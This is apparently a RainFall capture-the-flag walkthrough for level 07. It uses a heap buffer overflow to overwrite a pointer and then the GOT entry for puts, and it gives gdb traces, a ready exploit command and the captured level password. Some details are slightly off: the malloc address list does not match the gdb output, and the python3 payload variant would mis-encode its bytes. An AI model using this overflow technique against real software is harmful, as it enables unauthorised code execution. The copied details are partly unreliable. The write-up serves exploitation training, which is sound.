# Level 07 Walkthrough

## Binary analysis

The binary allocates two structures and two string buffers on the heap. It uses `strcpy` to copy user input into the first buffer, then again into the second buffer, using pointers stored in the structures. The goal is to overflow the first buffer to overwrite the pointer in the second structure, so that the second `strcpy` writes to a controlled location (e.g., the GOT entry for `puts`).

```
080484f4    int32_t m()
08048520        return printf(format: "%s - %d\n", &c, time(nullptr))


08048521    int32_t main(int32_t argc, char** argv, char** envp)
08048531        int32_t* eax = malloc(bytes: 8)
0804853e        *eax = 1
08048556        eax[1] = malloc(bytes: 8)
08048560        int32_t* eax_4 = malloc(bytes: 8)
0804856d        *eax_4 = 2
08048585        eax_4[1] = malloc(bytes: 8)
080485a0        strcpy(eax[1], argv[1])
080485bd        strcpy(eax_4[1], argv[2])
080485eb        fgets(buf: &c, n: 0x44, fp: fopen(filename: "/home/user/level8/.pass", mode: u"r…"))
080485f7        puts(str: "~~")
08048602        return 0
```

With gdb, we find the addresses returned by `malloc` for the two structures and the two buffers:
```
- malloc for struct_1 (0x0804a018)
- malloc for buffer_1 (0x0804a028)
- malloc for struct_2 (0x0804a038)
- malloc for buffer_2 (0x0804a048)
```

```
(gdb) b *0x08048536
Breakpoint 1 at 0x8048536
(gdb) b *0x08048550
Breakpoint 2 at 0x8048550
(gdb) b *0x08048565
Breakpoint 3 at 0x8048565
(gdb) b *0x0804857f
Breakpoint 4 at 0x804857f
(gdb) r hello world
Starting program: /home/user/level7/level7 hello world

Breakpoint 1, 0x08048536 in main ()
(gdb) p/x $eax
$1 = 0x804a008
(gdb) c
Continuing.

Breakpoint 2, 0x08048550 in main ()
(gdb) p/x $eax
$2 = 0x804a018
(gdb) c
Continuing.

Breakpoint 3, 0x08048565 in main ()
(gdb) p/x $eax
$3 = 0x804a028
(gdb) c
Continuing.

Breakpoint 4, 0x0804857f in main ()
(gdb) p/x $eax
$4 = 0x804a038
```

```
level7@RainFall:~$ objdump -R ./level7 | grep puts
08049928 R_386_JUMP_SLOT   puts
```

## Exploitation

We overflow buffer_1 (starting at 0x0804a028) with 20 bytes to reach the pointer at 0x0804a03c. We overwrite this pointer with the address of the GOT entry for `puts` (0x08049928). Then, for the second argument, we provide the address of a function to execute (e.g., the address of a shell function or system call).

To determine the required padding, we need to understand the layout of the structures and buffers on the heap. Here, `buffer_1` starts at address `0x0804a028` and the pointer we want to overwrite in `struct_2` is located at `0x0804a03c`. The difference between these two addresses gives the number of bytes to fill in order to reach the target field:

0x0804a03c - 0x0804a028 = 0x14 = 20 bytes

So, we need 20 bytes of padding (for example, `"A"*20`) to fill `buffer_1` up to the pointer in `struct_2`.

Example payload:

```bash
./level7 "$(python3 -c 'print("A"*20 + "\x28\x99\x04\x08")')" "$(python3 -c 'print("\xf4\x84\x04\x08")')"
```

- 20 bytes of padding ("A"*20)
- Overwrite pointer with 0x08049928 (GOT entry for puts)
- Second argument: address to write (e.g., 0x080484f4)

## Commands used

```
./level7 "$(printf 'AAAAAAAAAAAAAAAAAAAA\x28\x99\x04\x08')" "$(printf '\xf4\x84\x04\x08')"
```

## Result

After running the exploit, we get the password for level8:

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```